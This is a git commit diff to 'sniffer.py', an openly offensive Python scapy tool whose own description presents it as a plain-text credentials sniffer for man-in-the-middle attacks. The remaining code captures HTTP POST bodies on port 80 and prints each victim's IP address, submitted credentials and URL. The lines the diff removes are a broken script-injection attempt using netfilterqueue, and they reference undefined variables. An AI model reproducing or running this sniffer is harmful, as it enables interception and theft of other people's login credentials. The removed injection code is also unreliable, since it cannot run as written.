afedd5d00dc93aee744035d1b96d8182407a0501
juanga333 <juangaruiz19@gmail.com>
2021-01-28 11:44:01 +0000

    m

--- sniffer.py
+++ sniffer.py
@@ -4,9 +4,6 @@ from scapy.layers.http import HTTPRequest
 from scapy.layers.inet import IP
 from scapy.packet import Raw
 from scapy.sendrecv import sniff
-import urllib
-import re
-import netfilterqueue
 
 
 class bcolors:
@@ -21,47 +18,25 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 
-def change_payload(packet, load):
-    packet[scapy.Raw].load = load
-    del packet[scapy.IP].len
-    del packet[scapy.IP].chksum
-    del packet[scapy.TCP].chksum
-    return packet
-
-
 def credentialsSniffing(packet):
     try:
-        http = scapy.IP(packet.get_payload())
-        if http.haslayer(scapy.Raw):
-            load = http[scapy.Raw].load
-            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
-            injection = "<script>alert(1)</script>"
-            load = load.replace("</body>", injection_code + "</body>")
-            length_search = re.search("(?:Content-Length:\s)(\d*)", load)
-            length = length_search.group(1)
-            new_length = int(length) + len(injection)
-            load = load.replace(length, str(new_length))
-            if load != http_packet[scapy.Raw].load:
-                new_packet = change_payload(http_packet, load)
-                packet.set_payload(str(new_packet))
-                packet.accept()
-                print("lo intenta")
-            queue = netfilterqueue.NetfilterQueue()
-            queue.bind(0, inject_code)
-            queue.run()
-
         if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == "POST":
             url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
             ipVictim = packet[IP].src
-            credentials = packet[Raw].load.decode("utf-8")
+            try:
+                credentials = packet[Raw].load.decode("utf-8")
+            except:
+                credentials = packet[Raw].load
+
             print(f'{bcolors.OKBLUE}---New HTTP POST---{bcolors.ENDC}')
-            print(f"{bcolors.FAIL}[*]{bcolors.ENDC} From: {ipVictim} {bcolors.WARNING}{credentials} {bcolors.ENDC}{bcolors.UNDERLINE}{url}")
+            print(f"{bcolors.FAIL}[*]{bcolors.ENDC} From: {ipVictim} {bcolors.WARNING}{credentials} {bcolors.ENDC}{bcolors.UNDERLINE}{url}{bcolors.ENDC}")
     except:
         pass
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="This script is a plain text credentials sniffer. It will show you HTTP POST. "
                                                  "It is developed to be used in man in the middle attacks (maybe with a dhcp server?). "
                                                  "If you are using it with a dhcp server, you need to enable forwarding.")
-    print("Sniffing...")
+    print("Sniffing HTTP credentials...")
     sniff(filter="tcp and (port 80)", prn=credentialsSniffing)
